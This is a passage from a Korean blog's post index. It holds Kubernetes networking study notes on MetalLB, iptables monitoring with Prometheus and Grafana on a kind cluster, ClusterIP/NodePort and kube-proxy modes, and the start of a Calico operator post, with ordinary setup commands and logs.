172.18.255.201 80:30199/TCP 6h52m svc3 LoadBalancer 10.200.1.175 172.18.255.202 80:30462/TCP 6h52m ❯ curl -s 172.18.255.200 Hostname: webpod2 IP: 127.0.0.1 IP: ::1 IP: 10.10.1.2 IP: fe80::b862:52ff:fed1:7cbb RemoteAddr: 172.18.0.2:3343 GET / HTTP/1.1 Host: 172.18.255.200 User-Agent: curl/8.5.0 Accept: */* ❯ curl -s 172.18.255.201 Hostname: webpod1 IP: 127.0.0.1 IP: ::1 IP: 10.10.3.2 IP: fe80::d0fa:f1ff:fe03:49bf RemoteAddr: 10.10.3.1:20630 GET / HTTP/1.1 Host: 172.18.255.201 User-Agent: curl/8.5.0 Accept: */* ❯ curl -s 172.18.255.202 Hostname: webpod2 IP: 127.0.0.1 IP: ::1 IP: 10.10.1.2 IP: fe80::b862:52ff:fed1:7cbb RemoteAddr: 172.18.0.3:6166 GET / HTTP/1.1 Host: 172.18.255.202 User-Agent: curl/8.5.0 Accept: */* 7. 뱀다리 a. docker bridge network default cidr? \u0026hellip; 가만 생각해보니, 172.18.0.0 대역을 yaml에 지정도 안했는데 그눔의 Docker 문서에선 눈에 잘 안 띄네?를 2주 전부터 생각했었는데요\nserverfault/916941을 보고 기억났습니다.\n도커 네트워크 브릿지 설정 값을 보면 되는 것 \u0026hellip; 분명 이거 덕분에 삽질을 좀 했던거로 아는데 안 적어두니 또륵.\n도커가 이렇게나 위?험합니다.\n❯ docker -v Docker version 24.0.7, build 24.0.7-0ubuntu4.1 ❯ sudo docker network ls NETWORK ID NAME DRIVER SCOPE a90c02431872 bridge bridge local d2f5be011872 host host local 439c3626705a none null local ❯ sudo docker network inspect bridge [ { \u0026#34;Name\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;a90c02431872f243e6c3918d0ca4f8875fb070ae0ad1a504891b74485634de14\u0026#34;, \u0026#34;Created\u0026#34;: \u0026#34;2024-10-02T08:22:04.247414071+09:00\u0026#34;, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;EnableIPv6\u0026#34;: false, \u0026#34;IPAM\u0026#34;: { \u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;Options\u0026#34;: null, \u0026#34;Config\u0026#34;: [ { \u0026#34;Subnet\u0026#34;: \u0026#34;172.17.0.0/16\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.17.0.1\u0026#34; } ] }, \u0026#34;Internal\u0026#34;: false, \u0026#34;Attachable\u0026#34;: false, \u0026#34;Ingress\u0026#34;: false, \u0026#34;ConfigFrom\u0026#34;: { \u0026#34;Network\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;ConfigOnly\u0026#34;: false, \u0026#34;Containers\u0026#34;: {}, \u0026#34;Options\u0026#34;: { \u0026#34;com.docker.network.bridge.default_bridge\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_icc\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_ip_masquerade\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.host_binding_ipv4\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;com.docker.network.bridge.name\u0026#34;: \u0026#34;docker0\u0026#34;, \u0026#34;com.docker.network.driver.mtu\u0026#34;: \u0026#34;1500\u0026#34; }, \u0026#34;Labels\u0026#34;: {} } ] b. docker 권한 안 풀어두면, kind 에러 터지는 그거 예, 그 뻔한 그거에요. 이 기기에서는 세팅을 안해뒀네요.\nERROR: failed to create cluster: failed to list nodes: command \u0026#34;docker ps -a --filter label=io.x-k8s.kind.cluster=myk8s --format \u0026#39;{{.Names}}\u0026#39;\u0026#34; failed with error: exit status 1 Command Output: permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get \u0026#34;http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1\u0026amp;filters=%7B%22label%22%3A%7B%22io.x-k8s.kind.cluster%3Dmyk8s%22%3Atrue%7D%7D\u0026#34;: dial unix /var/run/docker.sock: connect: permission denied 이렇게 하면 됩니다. 참 쉽죠?\n# https://snapcraft.io/docker refer and apply sudo addgroup --system docker sudo adduser $USER docker newgrp docker sudo service docker restart ❯ sudo addgroup --system docker info: The group `docker\u0026#39; already exists as a system group. Exiting. ❯ sudo adduser $USER docker info: Adding user `kkumtree\u0026#39; to group `docker\u0026#39; ... ❯ newgrp docker ❯ sudo service docker restart c. MetalLB 설치 후 Controller 및 Speaker 확인 다른 방법도 있습니다.\n❯ kubectl get deployment -n metallb-system controller NAME READY UP-TO-DATE AVAILABLE AGE controller 1/1 1 1 2d17h ❯ kubectl get daemonset -n metallb-system speaker NAME DESIRED CURRENT READY UP-TO-DATE AVAILABLE NODE SELECTOR AGE speaker 4 4 4 4 4 kubernetes.io/os=linux 2d17h d. Log cuncurrency 에러 ❯ kubectl logs -n metallb-system -l app=metallb -f error: you are attempting to follow 6 log streams, but maximum allowed concurrency is 5, use --max-log-requests to increase the limit 그러면 하라는 대로 해야죠\n❯ kubectl logs -n metallb-system -l app=metallb -f --max-log-requests 6 # (중략) 로그는 잘 나옵니다. failed to create fsnotify watcher: too many open files ??? 그것 참 까칠한 친구네요. \u0026hellip; 아 fd 문제인거 같은데요?\n# 1024인데 부족하다고? # 아 다른거도 켜고 하고 있었구나 ❯ ulimit -n 1024 /etc/security/limits.conf 를 수정해서 아래처럼 값 넣고 활성화 할 수는 있는데, 제 노트북을 건드리려니 좀 께름칙하군요.\n얌전히 기본값 쓰겠습니다(?).\n#\u0026lt;domain\u0026gt; \u0026lt;type\u0026gt; \u0026lt;item\u0026gt; \u0026lt;value\u0026gt; * soft nofile 10000 * hard nofile 30000 Reference 다 끝나갈 쯤에 발견한 건데, RedHat OpenShift Docs에 세상 친절하게 쓰여있었습니다\u0026hellip;\nOpenShift Container Platform ❯ 4.11 ❯ 네트워킹 ❯ 29장. MetalLB로 로드 밸런싱 ","date":"2024-10-02T12:54:17+09:00","permalink":"https://blog.minseong.xyz/post/kans-5w-metallb-loadbalancer/","section":"post","tags":["kans","kind","metallb","loadbalancer","kubernetes"],"title":"Kubernetes Service(2): LoadBalancer(MetalLB)"},{"categories":null,"contents":"iptables를 수집하여 Grafana로 표현하는 방법을 알아봅니다.\nCloudNet@에서 진행하고 있는 K8s Advanced Network Study(이하, KANS)를 통해 학습한 내용을 정리합니다.\n0. 환경 구성 (kind) 작성시간 이슈로 featureGates, ConfigPatches, networking 설정 설명은 스킵\u0026hellip;합니다.\na. 1 Master, 3 Slave 환경 구성 cat \u0026lt;\u0026lt;EOT\u0026gt; kind-svc-1w.yaml kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 featureGates: \u0026#34;InPlacePodVerticalScaling\u0026#34;: true \u0026#34;MultiCIDRServiceAllocator\u0026#34;: true nodes: - role: control-plane labels: mynode: control-plane topology.kubernetes.io/zone: ap-northeast-2a extraPortMappings: - containerPort: 30000 hostPort: 30000 - containerPort: 30001 hostPort: 30001 - containerPort: 30002 hostPort: 30002 kubeadmConfigPatches: - | kind: ClusterConfiguration apiServer: extraArgs: runtime-config: api/all=true controllerManager: extraArgs: bind-address: 0.0.0.0 etcd: local: extraArgs: listen-metrics-urls: http://0.0.0.0:2381 scheduler: extraArgs: bind-address: 0.0.0.0 - | kind: KubeProxyConfiguration metricsBindAddress: 0.0.0.0 - role: worker labels: mynode: worker1 topology.kubernetes.io/zone: ap-northeast-2a - role: worker labels: mynode: worker2 topology.kubernetes.io/zone: ap-northeast-2b - role: worker labels: mynode: worker3 topology.kubernetes.io/zone: ap-northeast-2c networking: podSubnet: 10.10.0.0/16 serviceSubnet: 10.200.1.0/24 EOT kind create cluster --config kind-svc-1w.yaml --name myk8s --image kindest/node:v1.31.0 b. 기본 툴 설치 docker exec -it myk8s-control-plane sh -c \u0026#39;apt update \u0026amp;\u0026amp; apt install tree psmisc lsof wget bsdmainutils bridge-utils net-tools ipset ipvsadm nfacct tcpdump ngrep iputils-ping arping git vim arp-scan -y\u0026#39; 1. prometheus stack 설치 (helm) a. repository 추가 및 구성 helm repo add prometheus-community https://prometheus-community.github.io/helm-charts cat \u0026lt;\u0026lt;EOT \u0026gt; monitor-values.yaml prometheus: prometheusSpec: podMonitorSelectorNilUsesHelmValues: false serviceMonitorSelectorNilUsesHelmValues: false nodeSelector: mynode: control-plane tolerations: - key: \u0026#34;node-role.kubernetes.io/control-plane\u0026#34; operator: \u0026#34;Equal\u0026#34; effect: \u0026#34;NoSchedule\u0026#34; grafana: defaultDashboardsTimezone: Asia/Tokyo adminPassword: kans7969 service: type: NodePort nodePort: 30002 nodeSelector: mynode: control-plane tolerations: - key: \u0026#34;node-role.kubernetes.io/control-plane\u0026#34; operator: \u0026#34;Equal\u0026#34; effect: \u0026#34;NoSchedule\u0026#34; defaultRules: create: false alertmanager: enabled: false EOT b. 설치 kubectl create ns monitoring helm install kube-prometheus-stack prometheus-community/kube-prometheus-stack --version 62.3.0 -f monitor-values.yaml --namespace monitoring c. prometheus 콘솔 접속 새로운 터미널을 열어, port-forwarding을 통해 접속합니다.\n# New Terminal kubectl port-forward svc/kube-prometheus-stack-grafana -n monitoring 9090:9090 골치 아픈 etcd 마저 붙은 걸 알 수 있습니다.\n사실, 바로 충돌될 줄 알고, 기대했는데\u0026hellip; 저런.\n충돌난다면, 주요한 이슈는 맨 위의 kind에서 지정한 port 불일치입니다.\n아래를 참고하여 고쳐보세요.\nhelm upgrade --install \\ --namespace monitoring --create-namespace \\ --repo https://prometheus-community.github.io/helm-charts \\ kube-prometheus-stack kube-prometheus-stack --values - \u0026lt;\u0026lt;EOF kubeEtcd: service: targetPort: 2381 EOF 2. Grafana dashboard 확인 Grafana에 접속해봅시다.\nkube-prometheus-stack을 기본 설치하면, node-exporter와 grafana도 함께 설치됩니다.\na. 접속 정보 확인 우선 접속할 ID와 패스워드를 알아야겠죠.\nkubectl get secret -n monitoring kube-prometheus-stack-grafana -o jsonpath=\u0026#34;{.data.admin-user}\u0026#34; | base64 --decode ; echo # admin kubectl get secret -n monitoring kube-prometheus-stack-grafana -o jsonpath=\u0026#34;{.data.admin-password}\u0026#34; | base64 --decode ; echo # kans7969 \u0026hellip;이렇게나 위험한걸 다들 쓰고있다니 존경합니다.\nb. Port 확인 앞에서 Grafana의 경우 NodePort로 미리 지정했기 때문에, 프로메테우스 때와는 달리 별도의 port-forwarding 설정은 필요없습니다.\nkubectl get svc -A -owide | grep NodePort # monitoring kube-prometheus-stack-grafana NodePort 10.200.1.25 \u0026lt;none\u0026gt; 80:30002/TCP 101m app.kubernetes.io/instance=kube-prometheus-stack,app.kubernetes.io/name=grafana 위의 경우에는 kind를 구성한, 컴퓨터의 브라우저에서 localhost:30002로 접속하면 됩니다.\nc. Dashboard 확인 Dashboard(13674): Grafana Labs 음 역시. 뭐가 많이 부족하죠? 각 노드의 iptables rule과 io up/down이 확인이 안되네요.\n이제 이걸해야됩니다.\n3. iptables exporter 설정 a. 원인 안내 간단합니다. 해당 대시보드 템플릿 안내문에, 템플릿 작성자가 따로 포크떠서 작성한 node-exporter를 안내하고 있기 때문이죠. Wow!\n그래도 안내라도 있어서 다행입니다. 한번 볼까요?\n(LeiShi1313/node_exporter): https://github.com/LeiShi1313/node_exporter/commits/master/ 뭔가 바뀐거도 보이고\u0026hellip; 아무래도 어떻게든 yaml에 때려넣어야하는 걸까\u0026hellip; 고민하게 됩니다.\nb. 고민해봅시다, 무엇을? helm을 쓰는 대다수의 사용자들은 알 필요도 없고\u0026hellip; 알 겨를도 없는 사항인데,\n헬름 차트에도 그 뭐냐, dependency라는 것이 존재하는데요.\n최신문서 기준 아래와 같이 아 맞다 의존성이지. 의존성이 걸려있는 것을 알 수 있습니다.\n음 읽고 더 미궁 속으로 빠집니다. 의존성 이름이 prometheus-node-exporter \u0026hellip; 음 큰일났네요.\nc. 그래도 그냥 더 볼까 일단 지금까지 태운 시간이 아까우니, 계속 봅니다.\n대시보드 기준으로 누락된 위젯에서 어떠한 값을 요청하는지 살펴봅니다.\nincrease(node_iptables_download_bytes_total{job=~\u0026quot;$job\u0026quot;,instance=~\u0026quot;$instance\u0026quot;}[$__range]) increase(node_iptables_upload_bytes_total{job=~\u0026quot;$job\u0026quot;,instance=~\u0026quot;$instance\u0026quot;}[$__range]) irate(node_v2ray_download_bytes_total{job=~\u0026quot;$job\u0026quot;,instance=~\u0026quot;$instance\u0026quot;,dimension=~\u0026quot;$dimension\u0026quot;,target=~\u0026quot;$target\u0026quot;}[5m]) irate(node_v2ray_upload_bytes_total{job=~\u0026quot;$job\u0026quot;,instance=~\u0026quot;$instance\u0026quot;,dimension=~\u0026quot;$dimension\u0026quot;,target=~\u0026quot;$target\u0026quot;}[5m]) irate(node_v2ray_download_bytes_total{job=~\u0026quot;$job\u0026quot;,instance=~\u0026quot;$instance\u0026quot;,dimension=~\u0026quot;$dimension\u0026quot;,target=~\u0026quot;$target\u0026quot;}[5m]) irate(node_iptables_download_bytes_total{job=~\u0026quot;$job\u0026quot;,instance=~\u0026quot;$instance\u0026quot;,chain=~\u0026quot;$dimension\u0026quot;,rule=~\u0026quot;$target\u0026quot;}[5m]) 역시, 누락된 위젯은 죄다 커밋내역과 연동된 내용이네요. 특히 v2ray 또한, 따로 GitHub repository가 있습니다.\n이제 선택지는 얼마 없는 것 같습니다.\np8s에서 target 살펴봤을때 없는 걸 보니, 활성화해서되면 okay 안되면\u0026hellip; GG\nA안) 기존 node-exporter를 활성화하여 사용.\n말이 되지 않음. 원본 node-exporter에는 v2ray 같은 건 있지 않았음. B안) 기존 helm 차트를 수정하여 node-exporter 참조 경로를 사용.\n그런, 험한거 하면 안될 것 같네요. C안) 뭔가 신비하고 놀라운 Discussion을 통해, 그저 더 삽질하기\u0026hellip;\n이걸로\u0026hellip; 해볼께요. 이걸 보니, 뭔가 심연을 느끼기 시작합니다. 빨리 도망쳐\nThis horrifying cron one liner when set as a cron simulates an iptables exporter. At least on debian buster/stretch it does. It gives more or less the same output as the dedicated iptables exporter. It just uses awk to process the output of iptables-save -c into something prometheus can understand, and pops it in the folder the node exporter monitors.\nSCRAPE_INTERVAL=15 OFFSET_INTERVAL=5 * * * * * root sleep $OFFSET_INTERVAL; for i in $(seq $SCRAPE_INTERVAL $SCRAPE_INTERVAL 60); do /usr/sbin/iptables-save -c | grep -v \u0026#39;^#\u0026#39; | grep -v \u0026#39;COMMIT\u0026#39; | sed -e s\u0026#39;/\\[//g;s/\\]//g\u0026#39; | awk -F\u0026#39;[ :]\u0026#39; \u0026#39;{ if($0 ~ /\\*/) { table=$0; gsub(\u0026#34;^*\u0026#34;,\u0026#34;\u0026#34;,table); } else if($0 ~ /^\\:/){ print \u0026#34;iptables_rule_bytes_total{chain=\\\u0026#34;\u0026#34; $2 \u0026#34;\\\u0026#34;,policy=\\\u0026#34;\u0026#34; $3 \u0026#34;\\\u0026#34;,table=\\\u0026#34;\u0026#34; table \u0026#34;\\\u0026#34;} \u0026#34; $5 \u0026#34;\\niptables_rule_packets_total{chain=\\\u0026#34;\u0026#34; $2 \u0026#34;\\\u0026#34;,policy=\\\u0026#34;\u0026#34; $3 \u0026#34;\\\u0026#34;,table=\\\u0026#34;\u0026#34; table \u0026#34;\\\u0026#34;} \u0026#34; $4; } else { rule=$5; for(i=6;i\u0026lt;=NF;i++){rule=rule\u0026#34; \u0026#34;$i} print \u0026#34;iptables_rule_bytes_total{chain=\\\u0026#34;\u0026#34; $4 \u0026#34;\\\u0026#34;,rule=\\\u0026#34;\u0026#34; rule \u0026#34;\\\u0026#34;,table=\\\u0026#34;\u0026#34; table \u0026#34;\\\u0026#34;} \u0026#34; $2 \u0026#34;\\niptables_rule_packets_total{chain=\\\u0026#34;\u0026#34; $4 \u0026#34;\\\u0026#34;,rule=\\\u0026#34;\u0026#34; rule \u0026#34;\\\u0026#34;,table=\\\u0026#34;\u0026#34; table \u0026#34;\\\u0026#34;} \u0026#34; $1; } }\u0026#39; \u0026gt; /var/lib/prometheus/node-exporter/iptables.prom; echo \u0026#34;iptables_scrape_success $(date +\\%s)\u0026#34; \u0026gt;\u0026gt; /var/lib/prometheus/node-exporter/iptables.prom; sleep $SCRAPE_INTERVAL; done 아저씨 말씀으로 된다니, 그냥 빠르게 다른 걸 더 찾아봅니다. $(date +\\%s)를 쓰면 그 로그는 조상님께서 없애줄거냐며 권한 이야기가 나오네요.\n사실 뭐 discussion에서 permission 언급되길래 찾아보니, pypi/iptables-exporter도 나오고 뭔가 어지러워보이다가 명료하게 권한 언급되는걸 봐서 해보기로 했습니다.\nd. Do\u0026hellip; It 권한 총 3개의 권한을 허용해야합니다. CAP_DAC_READ_SEARCH CAP_NET_ADMIN CAP_NET_RAW 권한의 적용 retailnext/iptables_exporter GitHub 첫 구절을 보면, 친절하게 systemd 옵션 재설정이 필요하다고 합니다. Unfortunately, iptables-save (which this exporter uses) doesn\u0026rsquo;t work without special permissions.\nIncluding the following systemd [Service] options will allow this exporter to work without running it as root:\nCapabilityBoundingSet=CAP_DAC_READ_SEARCH CAP_NET_ADMIN CAP_NET_RAW AmbientCapabilities=CAP_DAC_READ_SEARCH CAP_NET_ADMIN CAP_NET_RAW kbknapp/iptables_exporter GitHub 권한 부분 외에는 따라해볼만 하고, 커밋 기준 최신이어서 시도를 해봅니다. buggy 한 것은 어쩔 수 없을 듯 합니다. iptables_exporter 설치 가만 생각해보니 어차피 root로 접속하니, 되는지 정도만 보는 걸로 해봅니다.\nrust-toolkit은 생경하니, 바이너리(x86_64) 파일을 받아서 해봅니다.\ndocker exec -it myk8s-worker bash root@myk8s-worker:/# echo $PATH # /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin root@myk8s-worker:/# cd /tmp root@myk8s-worker:/tmp# curl https://github.com/kbknapp/iptables_exporter/releases/download/v0.4.0/iptables_exporter-v0.4.0-x86_64-linux-musl.tar.gz -o iptables_exporter-v0.4.0-x86_64-linux-musl.tar.gz -L % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 100 3114k 100 3114k 0 0 436k 0 0:00:07 0:00:07 --:--:-- 641k root@myk8s-worker:/tmp# tar -xvf iptables_exporter-v0.4.0-x86_64-linux-musl.tar.gz ./iptables_exporter ./iptables_exporter root@myk8s-worker:/tmp# mv iptables_exporter /usr/bin root@myk8s-worker:/tmp# iptables_exporter -V iptables_exporter v0.4.0 (f8d6fca92a) root@myk8s-worker:/tmp# rm * root@myk8s-worker:/tmp# cd - / root@myk8s-worker:/# systemD 등록 이제 background로 실행할 수 있도록 systemd에 등록합니다.\nroot@myk8s-worker:/# cat \u0026lt;\u0026lt;EOT \u0026gt; /etc/systemd/system/iptables_exporter.service [Unit] Description=iptables_exporter After=network.target [Service] Type=simple ExecStart=/usr/bin/iptables_exporter Restart=always RestartSec=5 CapabilityBoundingSet=CAP_DAC_READ_SEARCH CAP_NET_ADMIN CAP_NET_RAW AmbientCapabilities=CAP_DAC_READ_SEARCH CAP_NET_ADMIN CAP_NET_RAW [Install] WantedBy=multi-user.target EOT # permission root@myk8s-worker:/# chmod a+x /etc/systemd/system/iptables_exporter.service reload 후, 상태 체크\nroot@myk8s-worker:/# systemctl daemon-reload root@myk8s-worker:/# service status iptables_exporter status: unrecognized service root@myk8s-worker:/# service iptables_exporter status ○ iptables_exporter.service - iptables_exporter Loaded: loaded (/etc/systemd/system/iptables_exporter.service; disabled; preset: enabled) Active: inactive (dead) root@myk8s-worker:/# service iptables_exporter start root@myk8s-worker:/# service iptables_exporter status ● iptables_exporter.service - iptables_exporter Loaded: loaded (/etc/systemd/system/iptables_exporter.service; disabled; preset: enabled) Active: active (running) since Sun 2024-09-29 17:06:54 UTC; 2s ago Main PID: 8697 (iptables_export) Tasks: 1 (limit: 5729) Memory: 1.3M CPU: 13ms CGroup: /system.slice/iptables_exporter.service └─8697 /usr/bin/iptables_exporter Sep 29 17:06:54 myk8s-worker systemd[1]: Started iptables_exporter.service - iptables_exporter. Sep 29 17:06:54 myk8s-worker iptables_exporter[8697]: 2024-09-29T17:06:54.686186Z INFO iptables_exporter: Registering metrics... Sep 29 17:06:54 myk8s-worker iptables_exporter[8697]: 2024-09-29T17:06:54.686280Z INFO iptables_exporter: Spawning server... Sep 29 17:06:54 myk8s-worker iptables_exporter[8697]: 2024-09-29T17:06:54.686338Z INFO iptables_exporter: Collecting iptables metrics... Sep 29 17:06:54 myk8s-worker iptables_exporter[8697]: 2024-09-29T17:06:54.687570Z INFO iptables_exporter: Collecting iptables metrics... root@myk8s-worker:/# exit scrape_config 설정 이제 위에서 사용했던, monitor-values.yaml을 수정합니다.\ncat \u0026lt;\u0026lt;EOT \u0026gt; monitor-values.yaml prometheus: prometheusSpec: podMonitorSelectorNilUsesHelmValues: false serviceMonitorSelectorNilUsesHelmValues: false nodeSelector: mynode: control-plane tolerations: - key: \u0026#34;node-role.kubernetes.io/control-plane\u0026#34; operator: \u0026#34;Equal\u0026#34; effect: \u0026#34;NoSchedule\u0026#34; additionalScrapeConfigs: | - job_name: \u0026#39;iptables\u0026#39; static_configs: - targets: [\u0026#39;localhost:9455\u0026#39;, \u0026#39;172.18.0.3:9455\u0026#39;] relabel_configs: - source_labels: [ \u0026#39;__address__\u0026#39; ] regex: \u0026#39;(.*):\\d+\u0026#39; target_label: instance grafana: defaultDashboardsTimezone: Asia/Tokyo adminPassword: kans7969 service: type: NodePort nodePort: 30002 nodeSelector: mynode: control-plane tolerations: - key: \u0026#34;node-role.kubernetes.io/control-plane\u0026#34; operator: \u0026#34;Equal\u0026#34; effect: \u0026#34;NoSchedule\u0026#34; defaultRules: create: false alertmanager: enabled: false EOT helm upgrade --install \\ --namespace monitoring --create-namespace \\ --repo https://prometheus-community.github.io/helm-charts \\ kube-prometheus-stack kube-prometheus-stack --values monitor-values.yaml 다시 살펴보니.. 역시 에러가 나있는 군요.\n포트 안 열려있어서 그런거 같은데, 일단 자야겠습니다.\nReference https://medium.com/@charled.breteche/kind-fix-missing-prometheus-operator-targets-1a1ff5d8c8ad\nhttps://sbcode.net/prometheus/prometheus-node-exporter-2nd/\nhttps://www.crybit.com/install-and-configure-node-exporter/\nhttps://docs.redhat.com/ko/documentation/red_hat_enterprise_linux/7/html/system_administrators_guide/sect-managing_services_with_systemd-unit_files#sect-Managing_Services_with_systemd-Unit_File_Create\n","date":"2024-09-29T13:35:13+09:00","permalink":"https://blog.minseong.xyz/post/kans-4w-iptables-grafana/","section":"post","tags":["kans","kind","iptables","kubernetes","grafana"],"title":"iptables monitoring with Grafana (Not Completed)"},{"categories":null,"contents":"Kubernetes의 (컨셉, 혹은 콘셉트라 불리는) Concepts 중에서 Service의 주제를 다뤄봅니다.\nCloudNet@에서 진행하고 있는 K8s Advanced Network Study(이하, KANS)를 통해 학습한 내용을 정리합니다.\nService Docs에 명료하게 적혀있긴 하지만,\n단위 기능으로 잘게 쪼갠 Pod는 결국 개별적인 IP를 갖게되는데, Blue/Green 이미지 업데이트를 비롯해서 같은 기능을 하는 새로운 Pod의 IP를 다른 Pod가 IP주소 그대로 접근하기 어려워 중간에 둔 것으로 이해를 해보았습니다.\n지금 레벨에서는 가정용 공유기에서 동적IP 환경에 대응하기 위해, DDNS를 사용하는 것과, MAC ADDR 기준으로 Static IP(DHCP모드시 활용)를 예약하는 것을 섞은 그 어딘가로 납득하고 계속 써보도록 하겠습니다.\n1. Service type 그리고 ClusterIP와 NodePort Service type은 expose(노출)범위에 따라, 아래와 같이 4가지입니다.\nClusterIP(default): (클러스터의) 내부 IP 대역에 노출시킵니다. 같은 뜻은 동일 클러스터 내부에서만 해당 서비스에 접근할 수 있습니다. Service에 대한 고정된 호출방법을 구성하는데, Static Virtual IP(고정 가상IP)와 Domain Name(주소, 혹은 도메인 네임)을 제공합니다. NodePort: (클러스터를 구성하는) 각 노드의 외부IP를 통해 접근할 수 있는 포트를 지정합니다. 어떻게보면 공유기의 port-forward 정도로 생각하면 좋을 것 같습니다.\n눈만 뜨면 늘 새로워 보이는 k8s 인지라, 이제서야 눈치를 챘지만 ClusterIP랑 배타적인 것은 아닙니다. LoadBalancer: 각 CSP에서 제공되는 LB를 기반으로 서비스의 \u0026ldquo;외부\u0026rdquo; 노출범위 결정권을 LB에 넘기는 것으로만 이해하는 중인데,\n이건 다음주차에 다뤄질 예정인지라 이번에는 다루지 않습니다. ExternalName: CNAME 레코드 관리이며, 프록시가 구성되지 않는다고합니다. no proxying of any kind\nDNS공급자랑 호환(ACME)이 안되면 난이도가 매우 높아지는 걸로만 파악.\n이 또한 생략. 이거로 ClusterIP와 NodePort를 다 이해하면 좋겠지만, iptables 처리도 이해가 필요했습니다.\n결국 Network traffic의 문제라 어디에서 이를 처리하는지도 봐야합니다.\na. ClusterIP iptables: Control Plane의 iptables Rule에 의해 각 노드에 배포된 Pod에 연결됩니다. load balancing: 랜덤으로 각 파드에 부하분산(공통) sessionAffinity: 고정적인 접속 지원 및 최대 세션 고정 시간[default: 10800 (sec)]을 설정할 수 있음. ClusterIP의 단점 Health Check(H/C) 불가: 어플리케이션에 오류가 있는 Pod에 접근 가능.\nReadiness Probe 설정으로 서비스 엔드포인트에서 제외하여 이를 구현할 수 있음. sessionAffinity 이외에는 분산 방식 설정 불가능.\ncf. IPVS: 다양한 분산방식(알고리즘) 가능. b. NodePort iptables: 특정 Node의 iptables에 의해 이루어집니다. 노드의 Public IP 등을 통해 접속하는데\n해당 노드 안에 없는 Pod여도 다른 노드로 리디렉션되는 것으로 보입니다. load balancing: 랜덤으로 각 파드에 부하분산(공통) NodePort의 단점 보안 취약: 외부에서 노드의 Public IP 및 포트로 접속하니까. LoadBalancer Service Type으로 외부 공개 최소화. 기본적으로 외부 클라이언트의 IP를 웹서버에서 수집 불가함. 노드의 IP로 SNAT 되기 때문.\n{ externalTrafficPolicy: local } 설정시, 해당 노드에 배치된 파드로만 접속되기에 SNAT되지 않아 수집가능. { externalTrafficPolicy: local } 상태에서 파드가 존재하지 않는 노드IP의 NodePort로 접속 시 실패.\n이 또한 LB Service Type에서 Probe(H/C)로 대응 가능. 2. kube-proxy 모드 정리 Mode: iptables / ipvs / nftables / eBPF\nkube-proxy 가 이제 kubernetes 운용시 optional로 되었지만, 각 모드 자체는 인지할 필요성이 있었습니다.\na. user space (deprecated) 1 Port : 1 Service Mapping user space -\u0026gt; kernel space: 변환 비용 kube-proxy 프로세스 장애시, SPOF. 대응이 어려움 b. iptables (iptables APIs -\u0026gt; netfilter subsystem) SPOF 해소: netfilter가 proxy 역할을 대신 수행 kube-proxy: netfilter rule 수정 담당, DaemonSet 구성 c. IPVS (kernel IPVS, iptables APIs -\u0026gt; netfilter subsystem) 사실 이거 때문에 정리를 했습니다.\nIPVS 란? Linux 커널단에서 제공하는 L4 Load Balancer: transport에서는 Port로 서비스 구분 iptables와 유사한 netfilter hook 기능을 기반으로 하나,\nhash table을 default 데이터 구조로 사용하고, kernel space에서 동작. 결국, Packet LB 수행시 iptable보다 높은 성능을 보임. Proxy rule sync 및 리디레션 latency, 높은 network traffic 처리에 있어 성능 향상. d. nftables (ntables API -\u0026gt; netfilter subsystem) Only available on Linux Node, specific Linux kernel(\u0026gt;=5.13) required. Alternative of iptables API for speed and scailability. 현재 k8s v1.31 기준, 모든 network plugin과 호환되지 않을 것이라고 확인. e. eBPF (+XDP Networking Module) L3/L4 구간(Netfilter \u0026lt;-\u0026gt; TCP/UCP)을 거치는 kernel overhead마저 bypass 목적 ","date":"2024-09-27T21:28:17+09:00","permalink":"https://blog.minseong.xyz/post/kans-4w-clusterip-nodeport/","section":"post","tags":["kans","clusterip","nodeport","kubernetes"],"title":"Kubernetes Service(1): ClusterIP/NodePort"},{"categories":null,"contents":"CloudNet@에서 진행하고 있는 K8s Advanced Network Study(이하, KANS)를 통해 학습한 내용을 정리합니다.\n스터디 진행 시, Manifests를 사용하여 Calico를 설치하였으나,\nOperator를 사용하여 설치하는 방법을 정리합니다.\n과제는 아니었지만, 요새 다들 Operator Framework를 사용해서 마라샹궈 볶듯이\nOperator를 지지고 볶는 것 같아서 호기심에 정리해보았습니다.\n참고로 Manifests를 사용하여 설치 시, 50개의 노드[1]를 초과하는 경우 Typha를 구성하여야 합니다.\nCalico 설치 환경 : AWS EC2(No EKS), kubeadm[2], pod-network-cidr=172.16.0.0/16, IPIP Mode\n1. Calico Routing Mode 위에 언급된 IPIP Mode를 이해하려면 Calico의 Routing Mode를 훑을 필요성이 있었습니다.\n파드간 통신 시 노드 간에 encapsulation의 전략을 기준으로 나뉘어 볼 수 있겠습니다.\nIPIP Mode: (tunl interface)\nIP header로 감싸(encapsulate)서 다시 Outer header를 제거하는 방식. VXLAN Mode: (vxlan interface)\nUDP header로 감싸서 다시 Outer header를 제거하는 방식. Direct Mode: 원본 패킷 그대로. CSP의 경우 NIC에서 Src/Dest Check 기능 Disable 필요. 그 외에도 (Network Level)Pod traffic Encryption[3] 이 있습니다.\nAzure에서는 VNet에서 IPIP가 차단됩니다. 사실 IPIP Mode로 구성할 경우, CSP레벨이 아닌 Kubeadm 등에서 지정한 pod network cidr같은 사용자 정의 값을 고려해야하여 관리적 측면에서 이슈가 되기에, VXLAN Mode를 사용하는 것이 여러모로 좋아보입니다. 물론 이거도 Azure 쓸 때 해봐야 겠지요.\n2. Calico Operator 설치 및 설정 Docs: Install Calico/Operator\n그냥 쓱쓱 읽으면, Operator를 위한 CRD 설치 및 Custom 설정만 적용하면 됩니다.\n그게 끝이고 그게 